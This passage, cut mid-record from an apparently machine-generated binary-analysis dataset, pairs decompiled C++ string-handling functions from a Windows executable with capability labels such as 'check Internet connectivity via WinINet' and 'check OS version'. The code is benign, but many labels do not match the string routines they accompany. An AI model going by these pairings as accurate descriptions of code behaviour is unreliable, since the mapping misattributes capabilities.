(uVar11 < in_R8) {\n                                piVar8 = 0x14010bc57;\n                                ppiVar4 = 0x14010baf8;\n                                fcn.1400b7b60(0x14010baf8, 0x14010bc57, in_R8, uVar11);\n                                iVar7 = *piVar8;\n                                *ppiVar4 = ppiVar4 + 2;\n                                iVar10 = piVar8[1] + iVar7;\n                            }\n                            else {\n                                iVar7 = *piVar8 + in_R8;\n                                uVar5 = uVar11 - in_R8;\n                                if (arg4 < uVar11 - in_R8) {\n                                    uVar5 = arg4;\n                                }\n                                iVar10 = iVar7 + uVar5;\n                                puVar9 = &stack0xffffffffffffff40;\n                            }\n                        }\n                        else {\n                            iVar7 = *piVar8 + in_R8;\n                            uVar5 = arg4 - in_R8;\n                            if (uVar11 < arg4 - in_R8) {\n                                uVar5 = uVar11;\n                            }\n                            iVar10 = iVar7 + uVar5;\n                            puVar9 = &stack0xffffffffffffff68;\n                        }\n                    }\n                    else {\n                        iVar7 = *arg2 + in_R8;\n                        iVar10 = *arg2 + uVar11;\n                        puVar9 = &stack0xffffffffffffff90;\n                    }\n                    *(puVar9 + -8) = unaff_RBP;\n                    *(puVar9 + 8) = ppiVar4;\n                    *(puVar9 + 0x10) = iVar7;\n                    *(puVar9 + 0x18) = iVar10;\n                    *(puVar9 + -0x50) = 0x1400a70c4;\n                    uVar3 = fcn.1400b8050(*(puVar9 + 0x10), *(puVar9 + 0x18));\n                    *(puVar9 + -0x18) = uVar3;\n                    if (*(puVar9 + -0x18) < 0x10) {\n                        *(puVar9 + -0x10) = *(puVar9 + 8);\n                        *(puVar9 + -0x50) = 0x1400a711d;\n                        fcn.1400a75f0(*(puVar9 + -0x10));\n                    }\n                    else {\n                        *(puVar9 + -0x50) = 0x1400a70e8;\n                        uVar3 = fcn.1400a9310(*(puVar9 + 8), puVar9 + -0x18, 0);\n                        *(puVar9 + -0x50) = 0x1400a70f7;\n                        fcn.1400a86c0(*(puVar9 + 8), uVar3);\n                        *(puVar9 + -0x50) = 0x1400a7107;\n                        fcn.1400a6e40(*(puVar9 + 8), *(puVar9 + -0x18));\n                    }\n                    *(puVar9 + -0x50) = 0x1400a712e;\n                    fcn.1400bc660(puVar9 + -0x20, *(puVar9 + 8));\n                    *(puVar9 + -0x50) = 0x1400a713a;\n                    uVar3 = fcn.14002fcc0(*(puVar9 + 8));\n                    *(puVar9 + -0x50) = 0x1400a7150;\n                    fcn.1400a7650(uVar3, *(puVar9 + 0x10), *(puVar9 + 0x18));\n                    *(puVar9 + -0x20) = 0;\n                    *(puVar9 + -0x50) = 0x1400a7168;\n                    fcn.1400a7600(*(puVar9 + 8), *(puVar9 + -0x18));\n                    *(puVar9 + -0x50) = 0x1400a7174;\n                    fcn.1400bc680(puVar9 + -0x20);\n                    return;\n                }\n                uStack120 = 0x1400a9852;\n                ppiVar4 = fcn.1400bc710(piVar8 + 1);\n                ppiVar6[2] = piVar8;\n                *ppiVar6 = ppiVar4;\n            }\n            uStack120 = 0x1400a9867;\n            sub.msvcrt.dll_memcpy(ppiVar4, puVar2, piVar8);\n            ppiVar6[1] = piVar8;\n            *(*ppiVar6 + piVar8) = 0;\n            return;\n        }\n        puStack64 = 0x1400a97a2;\n        ppiVar4 = fcn.1400bc710(piStack72 + 1);\n        arg1[2] = piStack72;\n        *arg1 = ppiVar4;\n    }\n    puStack64 = 0x1400a97b7;\n    sub.msvcrt.dll_memcpy(ppiVar4, puVar9, piStack72);\n    arg1[1] = piStack72;\n    *(*arg1 + piStack72) = 0;\n    return;\n}\n",
        "token_count": 2122
    },
    "1400a9bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.1400a9bc0(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    ulong arg2_00;\n    int64_t iVar1;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_bp_30h;\n    ulong var_8h;\n    \n    arg2_00 = fcn.1400a75f0(arg1);\n    fcn.1400a6e60(arg1, arg2_00);\n    if (arg2 == 0) {\n        fcn.1400bd270(0x14010a5b0);\n    }\n    iVar1 = fcn.140080be0(arg2);\n    fcn.1400a70a0(arg1, arg2, iVar1 + arg2);\n    return;\n}\n",
        "token_count": 193
    },
    "1400aa32": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong * fcn.1400aa320(ulong *arg1, ulong *arg2)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    ulong *puVar4;\n    int64_t iVar5;\n    \n    puVar1 = *arg2;\n    puVar3 = arg2 + 2;\n    puVar4 = *arg1;\n    if (puVar3 == puVar1) {\n        if (arg1 != arg2) {\n            iVar5 = arg2[1];\n            if (iVar5 != 0) {\n                if (iVar5 == 1) {\n                    *puVar4 = *(arg2 + 2);\n                    puVar4 = *arg1;\n                    iVar5 = arg2[1];\n                }\n                else {\n                    sub.msvcrt.dll_memcpy();\n                    puVar4 = *arg1;\n                    iVar5 = arg2[1];\n                }\n            }\n            arg1[1] = iVar5;\n            *(puVar4 + iVar5) = 0;\n            puVar3 = *arg2;\n        }\n    }\n    else {\n        if (puVar4 == arg1 + 2) {\n            *arg1 = puVar1;\n            arg1[1] = arg2[1];\n            arg1[2] = arg2[2];\n        }\n        else {\n            *arg1 = puVar1;\n            uVar2 = arg1[2];\n            arg1[1] = arg2[1];\n            arg1[2] = arg2[2];\n            if (puVar4 != NULL) {\n                *arg2 = puVar4;\n                arg2[2] = uVar2;\n                puVar3 = puVar4;\n                goto code_r0x0001400aa367;\n            }\n        }\n        *arg2 = puVar3;\n    }\ncode_r0x0001400aa367:\n    arg2[1] = 0;\n    *puVar3 = 0;\n    return arg1;\n}\n",
        "token_count": 438
    },
    "1400aa79": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong * fcn.1400aa790(ulong *arg1, int64_t arg2, uint64_t arg3, ulong *arg4)\n\n{\n    ushort *puVar1;\n    ulong *puVar2;\n    char *pcVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    bool bVar8;\n    uint64_t in_stack_00000028;\n    \n    iVar5 = arg1[1];\n    if ((arg3 + 0x1fffffffffffffff) - iVar5 < in_stack_00000028) {\n        pcVar3 = \"basic_string::_M_replace\";\n        fcn.1400bd360(\"basic_string::_M_replace\");\n        puVar2 = 0x7fffffff;\n        uVar4 = pcVar3 - arg2;\n        if ((uVar4 < 0x80000000) && (puVar2 = 0x80000000,  -0x80000001 < uVar4)) {\n            puVar2 = uVar4 & 0xffffffff;\n        }\n        return puVar2;\n    }\n    puVar2 = *arg1;\n    uVar4 = iVar5 + (in_stack_00000028 - arg3);\n    if (puVar2 == arg1 + 2) {\n        uVar6 = 7;\n    }\n    else {\n        uVar6 = arg1[2];\n    }\n    if (uVar6 < uVar4) {\n        fcn.1400aced0(arg1, arg2, arg3, arg4);\n    }\n    else {\n        puVar1 = puVar2 + arg2 * 2;\n        iVar7 = iVar5 - (arg2 + arg3);\n        bVar8 = iVar7 != 0;\n        if ((arg4 < puVar2) || (puVar2 + iVar5 * 2 < arg4)) {\n            if ((arg3 != in_stack_00000028) && (bVar8)) {\n                if (iVar7 == 1) {\n                    puVar1[in_stack_00000028] = puVar1[arg3];\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar1 + in_stack_00000028, puVar1 + arg3, iVar7 * 2);\n                }\n            }\n            if (in_stack_00000028 == 0) goto code_r0x0001400aa849;\n            if (in_stack_00000028 != 1) {\n                sub.msvcrt.dll_memcpy(puVar1, arg4, in_stack_00000028 * 2);\n                puVar2 = *arg1;\n                goto code_r0x0001400aa84c;\n            }\ncode_r0x0001400aa978:\n            *puVar1 = *arg4;\n            puVar2 = *arg1;\n            goto code_r0x0001400aa84c;\n        }\n        if (in_stack_00000028 - 1 < arg3) {\n            if (in_stack_00000028 != 1) {\n                sub.msvcrt.dll_memmove(puVar1, arg4, in_stack_00000028 * 2);\n                goto code_r0x0001400aa8ab;\n            }\n            *puVar1 = *arg4;\n            if ((arg3 == 1) || (!bVar8)) goto code_r0x0001400aa84c;\ncode_r0x0001400aa8b5:\n            if (iVar7 == 1) {\n                puVar1[in_stack_00000028] = puVar1[arg3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar1 + in_stack_00000028, puVar1 + arg3, iVar7 * 2);\n            }\n        }\n        else {\ncode_r0x0001400aa8ab:\n            if ((arg3 != in_stack_00000028) && (bVar8)) goto code_r0x0001400aa8b5;\n        }\n        if (arg3 < in_stack_00000028) {\n            iVar5 = in_stack_00000028 * 2;\n            puVar2 = puVar1 + arg3;\n            if (arg4 + iVar5 <= puVar2) {\n                if (in_stack_00000028 != 1) {\n                    sub.msvcrt.dll_memmove(puVar1, arg4, iVar5);\n                    puVar2 = *arg1;\n                    goto code_r0x0001400aa84c;\n                }\n                goto code_r0x0001400aa978;\n            }\n            if (puVar2 <= arg4) {\n                if (in_stack_00000028 == 1) {\n                    *puVar1 = puVar1[(arg4 - puVar1 >> 1) + (in_stack_00000028 - arg3)];\n                    puVar2 = *arg1;\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(puVar1, puVar1 + (arg4 - puVar1 >> 1) + (in_stack_00000028 - arg3), iVar5);\n                    puVar2 = *arg1;\n                }\n                goto code_r0x0001400aa84c;\n            }\n            iVar5 = puVar2 - arg4;\n            if (iVar5 == 2) {\n                *puVar1 = *arg4;\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar1, arg4, iVar5);\n            }\n            iVar7 = in_stack_00000028 - (iVar5 >> 1);\n            if (iVar7 == 1) {\n                *(puVar1 + iVar5) = puVar1[in_stack_00000028];\n                puVar2 = *arg1;\n                goto code_r0x0001400aa84c;\n            }\n            if (iVar7 != 0) {\n                sub.msvcrt.dll_memcpy(puVar1 + iVar5, puVar1 + in_stack_00000028, iVar7 * 2);\n                puVar2 = *arg1;\n                goto code_r0x0001400aa84c;\n            }\n        }\n    }\ncode_r0x0001400aa849:\n    puVar2 = *arg1;\ncode_r0x0001400aa84c:\n    arg1[1] = uVar4;\n    *(puVar2 + uVar4 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 1407
    },
    "1400aab1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400aab10(int64_t *arg1, uint64_t arg2, ulong arg3)\n\n{\n    ushort *puVar1;\n    uint64_t uVar2;\n    uint64_t auStackX16 [3];\n    \n    if (arg2 < 8) {\n        puVar1 = *arg1;\n        if (arg2 == 0) goto code_r0x0001400aab33;\n    }\n    else {\n        auStackX16[0] = arg2;\n        puVar1 = fcn.1400ace50(arg1, auStackX16, 0);\n        *arg1 = puVar1;\n        arg1[2] = auStackX16[0];\n        arg2 = auStackX16[0];\n        if (auStackX16[0] == 0) goto code_r0x0001400aab33;\n    }\n    uVar2 = 0;\n    if (arg2 == 1) {\n        *puVar1 = arg3;\n    }\n    else {\n        do {\n            puVar1[uVar2] = arg3;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 != arg2);\n    }\ncode_r0x0001400aab33:\n    arg1[1] = arg2;\n    puVar1[arg2] = 0;\n    return;\n}\n",
        "token_count": 301
    },
    "1400aacf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400aacf0(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    ushort *puVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t aiStack64 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar4 = uVar3 >> 1;\n    aiStack64[0] = iVar4;\n    if (uVar3 < 0xf) {\n        puVar2 = *arg1;\n        uVar5 = uVar3;\n    }\n    else {\n        puVar2 = fcn.1400ace50(arg1, aiStack64, 0);\n        *arg1 = puVar2;\n        arg1[2] = aiStack64[0];\n        uVar5 = aiStack64[0] * 2;\n    }\n    iVar1 = aiStack64[0];\n    if (iVar4 == 1) {\n        *puVar2 = *arg2;\n    }\n    else if (iVar4 != 0) {\n        sub.msvcrt.dll_memcpy(puVar2, arg2, uVar3);\n        puVar2 = *arg1;\n    }\n    arg1[1] = iVar1;\n    *(puVar2 + uVar5) = 0;\n    return;\n}\n",
        "token_count": 306
    },
    "1400aada": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400aada0(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    ushort *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t aiStack48 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar2 = uVar3 >> 1;\n    aiStack48[0] = iVar2;\n    if (uVar3 < 0xf) {\n        puVar1 = *arg1;\n    }\n    else {\n        puVar1 = fcn.1400ace50(arg1, aiStack48, 0);\n        *arg1 = puVar1;\n        arg1[2] = aiStack48[0];\n    }\n    if (iVar2 == 1) {\n        *puVar1 = *arg2;\n    }\n    else if (iVar2 != 0) {\n        sub.msvcrt.dll_memcpy(puVar1, arg2, uVar3);\n        puVar1 = *arg1;\n    }\n    arg1[1] = aiStack48[0];\n    puVar1[aiStack48[0]] = 0;\n    return;\n}\n",
        "token_count": 261
    },
    "1400aae3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400aae30(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    ushort *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t aiStack48 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar2 = uVar3 >> 1;\n    aiStack48[0] = iVar2;\n    if (uVar3 < 0xf) {\n        puVar1 = *arg1;\n    }\n    else {\n        puVar1 = fcn.1400ace50(arg1, aiStack48, 0);\n        *arg1 = puVar1;\n        arg1[2] = aiStack48[0];\n    }\n    if (iVar2 == 1) {\n        *puVar1 = *arg2;\n    }\n    else if (iVar2 != 0) {\n        sub.msvcrt.dll_memcpy(puVar1, arg2, uVar3);\n        puVar1 = *arg1;\n    }\n    arg1[1] = aiStack48[0];\n    puVar1[aiStack48[0]] = 0;\n    return;\n}\n",
        "token_count": 261
    },
    "1400aaec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400aaec0(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    ushort *puVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t aiStack64 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar4 = uVar3 >> 1;\n    aiStack64[0] = iVar4;\n    if (uVar3 < 0xf) {\n        puVar2 = *arg1;\n        uVar5 = uVar3;\n    }\n    else {\n        puVar2 = fcn.1400ace50(arg1, aiStack64, 0);\n        *arg1 = puVar2;\n        arg1[2] = aiStack64[0];\n        uVar5 = aiStack64[0] * 2;\n    }\n    iVar1 = aiStack64[0];\n    if (iVar4 == 1) {\n        *puVar2 = *arg2;\n    }\n    else if (iVar4 != 0) {\n        sub.msvcrt.dll_memcpy(puVar2, arg2, uVar3);\n        puVar2 = *arg1;\n    }\n    arg1[1] = iVar1;\n    *(puVar2 + uVar5) = 0;\n    return;\n}\n",
        "token_count": 306
    },
    "1400aaf7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400aaf70(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    ushort *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t aiStack48 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar2 = uVar3 >> 1;\n    aiStack48[0] = iVar2;\n    if (uVar3 < 0xf) {\n        puVar1 = *arg1;\n    }\n    else {\n        puVar1 = fcn.1400ace50(arg1, aiStack48, 0);\n        *arg1 = puVar1;\n        arg1[2] = aiStack48[0];\n    }\n    if (iVar2 == 1) {\n        *puVar1 = *arg2;\n    }\n    else if (iVar2 != 0) {\n        sub.msvcrt.dll_memcpy(puVar1, arg2, uVar3);\n        puVar1 = *arg1;\n    }\n    arg1[1] = aiStack48[0];\n    puVar1[aiStack48[0]] = 0;\n    return;\n}\n",
        "token_count": 261
    },
    "1400ab0f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400ab0f0(int64_t *arg1, int64_t arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    int64_t *piVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    ushort in_stack_00000028;\n    \n    iVar6 = arg1[1];\n    if ((arg3 + 0x1fffffffffffffff) - iVar6 < arg4) {\n        pcVar5 = \"basic_string::_M_replace_aux\";\n        fcn.1400bd360(\"basic_string::_M_replace_aux\");\n        return pcVar5;\n    }\n    piVar3 = *arg1;\n    uVar7 = (arg4 - arg3) + iVar6;\n    if (piVar3 == arg1 + 2) {\n        uVar4 = 7;\n    }\n    else {\n        uVar4 = arg1[2];\n    }\n    if (uVar4 < uVar7) {\n        fcn.1400aced0(arg1, arg2, arg3, 0);\n        piVar3 = *arg1;\n    }\n    else {\n        iVar6 = iVar6 - (arg3 + arg2);\n        if ((iVar6 != 0) && (arg3 != arg4)) {\n            puVar1 = piVar3 + arg3 * 2 + arg2 * 2;\n            puVar2 = piVar3 + arg4 * 2 + arg2 * 2;\n            if (iVar6 == 1) {\n                *puVar2 = *puVar1;\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar2, puVar1, iVar6 * 2);\n                piVar3 = *arg1;\n            }\n        }\n    }\n    if (arg4 != 0) {\n        puVar1 = piVar3 + arg2 * 2;\n        uVar4 = 0;\n        if (arg4 == 1) {\n            *puVar1 = in_stack_00000028;\n        }\n        else {\n            do {\n                puVar1[uVar4] = in_stack_00000028;\n                uVar4 = uVar4 + 1;\n            } while (arg4 != uVar4);\n        }\n    }\n    arg1[1] = uVar7;\n    *(piVar3 + uVar7 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 559
    },
    "1400acc7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400acc70(int64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    iVar3 = arg1[1];\n    iVar5 = *arg1;\n    iVar4 = iVar3 - (arg2 + arg3);\n    if ((iVar4 != 0) && (arg3 != 0)) {\n        puVar1 = iVar5 + (arg2 + arg3) * 2;\n        puVar2 = iVar5 + arg2 * 2;\n        if (iVar4 == 1) {\n            *puVar2 = *puVar1;\n        }\n        else {\n            sub.msvcrt.dll_memmove(puVar2, puVar1, iVar4 * 2);\n            iVar3 = arg1[1];\n            iVar5 = *arg1;\n        }\n    }\n    arg1[1] = iVar3 - arg3;\n    *(iVar5 + (iVar3 - arg3) * 2) = 0;\n    return;\n}\n",
        "token_count": 254
    },
    "1400acd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400acd00(int64_t *arg1, ushort *arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    ushort *puVar2;\n    int64_t arg2_00;\n    int64_t *piVar3;\n    uint64_t uVar4;\n    \n    arg2_00 = arg1[1];\n    piVar3 = *arg1;\n    uVar1 = arg2_00 + arg3;\n    if (piVar3 == arg1 + 2) {\n        uVar4 = 7;\n    }\n    else {\n        uVar4 = arg1[2];\n    }\n    if (uVar4 < uVar1) {\n        fcn.1400aced0(arg1, arg2_00, 0, arg2);\n        piVar3 = *arg1;\n    }\n    else if (arg3 != 0) {\n        puVar2 = piVar3 + arg2_00 * 2;\n        if (arg3 == 1) {\n            *puVar2 = *arg2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar2, arg2, arg3 * 2);\n            piVar3 = *arg1;\n        }\n    }\n    arg1[1] = uVar1;\n    *(piVar3 + uVar1 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 311
    },
    "1400acd9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400acd90(ulong *arg1, ulong *arg2)\n\n{\n    uint64_t uVar1;\n    ushort *puVar2;\n    uint64_t arg3;\n    uint64_t auStack64 [2];\n    \n    if (arg1 == arg2) {\n        return;\n    }\n    puVar2 = *arg1;\n    uVar1 = arg2[1];\n    if (arg1 + 2 == puVar2) {\n        arg3 = 7;\n    }\n    else {\n        arg3 = arg1[2];\n    }\n    if (arg3 < uVar1) {\n        auStack64[0] = uVar1;\n        puVar2 = fcn.1400ace50(arg1, auStack64, arg3);\n        if (arg1 + 2 != *arg1) {\n            fcn.1400bc6c0();\n        }\n        *arg1 = puVar2;\n        arg1[2] = auStack64[0];\n    }\n    else if (uVar1 == 0) goto code_r0x0001400acdc9;\n    if (uVar1 == 1) {\n        *puVar2 = **arg2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar2, *arg2, uVar1 * 2);\n        puVar2 = *arg1;\n    }\ncode_r0x0001400acdc9:\n    arg1[1] = uVar1;\n    puVar2[uVar1] = 0;\n    return;\n}\n",
        "token_count": 342
    },
    "1400aced": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400aced0(ulong *arg1, int64_t arg2, int64_t arg3, ushort *arg4)\n\n{\n    ushort *puVar1;\n    ulong *puVar2;\n    ushort *puVar3;\n    ulong arg3_00;\n    int64_t iVar4;\n    int64_t in_stack_00000028;\n    int64_t aiStack80 [2];\n    \n    aiStack80[0] = (in_stack_00000028 - arg3) + arg1[1];\n    iVar4 = arg1[1] - (arg2 + arg3);\n    if (arg1 + 2 == *arg1) {\n        arg3_00 = 7;\n    }\n    else {\n        arg3_00 = arg1[2];\n    }\n    puVar3 = fcn.1400ace50(arg1, aiStack80, arg3_00);\n    if (arg2 != 0) {\n        if (arg2 == 1) {\n            *puVar3 = **arg1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3, *arg1, arg2 * 2);\n        }\n    }\n    if ((arg4 != NULL) && (in_stack_00000028 != 0)) {\n        if (in_stack_00000028 == 1) {\n            puVar3[arg2] = *arg4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + arg2, arg4, in_stack_00000028 * 2);\n        }\n    }\n    puVar2 = *arg1;\n    if (iVar4 != 0) {\n        puVar1 = puVar2 + (arg2 + arg3) * 2;\n        if (iVar4 == 1) {\n            puVar3[arg2 + in_stack_00000028] = *puVar1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + arg2 + in_stack_00000028, puVar1, iVar4 * 2);\n        }\n    }\n    if (arg1 + 2 != puVar2) {\n        fcn.1400bc6c0(puVar2);\n    }\n    *arg1 = puVar3;\n    arg1[2] = aiStack80[0];\n    return;\n}\n",
        "token_count": 509
    },
    "1400b4ba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
